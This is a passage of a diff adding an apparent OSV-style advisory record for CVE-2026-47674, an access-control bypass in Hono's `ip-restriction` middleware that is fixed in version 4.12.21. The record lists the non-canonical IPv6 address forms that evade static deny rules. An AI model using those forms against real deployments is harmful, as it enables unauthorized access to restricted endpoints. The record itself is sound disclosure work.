+    "details": "### Summary\n\nThe `ip-restriction` middleware (`hono/ip-restriction`) compares incoming IP addresses against configured deny and allow rules using string equality after partial normalization. Non-canonical IPv6 representations of an address already listed in a static rule \u2014 such as compressed forms, explicit-zero forms, or hex-notation IPv4-mapped addresses \u2014 do not match the normalized rule entry, causing the rule to be silently skipped.\n\n### Details\n\nWhen the rule matcher is built, each configured IP rule is normalized to a canonical string form. Incoming IP addresses received at request time are then compared against those canonical strings without applying the same normalization. Because IPv6 permits multiple syntactically different representations of the same numeric address, a non-canonical form of a denied address fails the string lookup and proceeds to the CIDR check, which also finds no match for rules registered as static (no prefix length). The request is then allowed.\n\nAffected non-canonical forms include:\n\n- Compressed versus expanded notation (`2001:db8::1` vs `2001:db8:0:0:0:0:0:1`)\n- Hex-notation IPv4-mapped addresses (`::ffff:7f00:1` vs `::ffff:127.0.0.1`)\n- Zone identifier suffixes (e.g., `fe80::1%eth0`)\n\nAdditionally, invalid IP address strings provided as the remote address are not rejected and may result in unexpected allow or deny behavior.\n\nThis issue arises when applications use `ipRestriction()` with static (non-CIDR) rules and the IP address source can supply addresses in non-canonical IPv6 form.\n\n### Impact\n\nA request from an IP address covered by a static deny rule may bypass the restriction if the address is presented in a non-canonical IPv6 form.\n\nThis may lead to:\n\n- Unauthorized access to endpoints intended to be restricted to specific IP addresses\n- Bypass of IP-based access controls in environments where the runtime or an upstream proxy provides source addresses in a form that differs from the canonical form used in the rule configuration\n\nThis issue affects applications using `hono/ip-restriction` with static deny rules for IPv4 or IPv6 addresses, particularly when the source address is derived from proxy headers or custom `getIP` implementations that may return non-canonical forms.",
+    "aliases": [
+     "CVE-2026-47674"
+    ],
+    "modified": "2026-09-10T03:51:09.776209033Z",
+    "published": "2026-06-04T18:00:22Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-06-04T18:00:22Z",
+     "nvd_published_at": "2026-05-28T17:16:32Z",
+     "cwe_ids": [
+      "CWE-1289",
+      "CWE-185"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-xrhx-7g5j-rcj5"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47674"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/c831020fb1fa2e929d222f6c84e1abfe013e512b"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.21"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.21"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xrhx-7g5j-rcj5/GHSA-xrhx-7g5j-rcj5.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+     }
+    ]
+   }
+  ],
+  "npm:@hono/aws-lambda": [],
+  "npm:@hono/bun": [],
+  "npm:@hono/cloudflare-workers": [],
+  "npm:@hono/deno": [],
+  "npm:@hono/lambda-edge": [],
+  "npm:@hono/netlify": [],
+  "npm:@hono/service-worker": [],
+  "npm:@hono/vercel": []
+ },
+ "entries": {}
+}
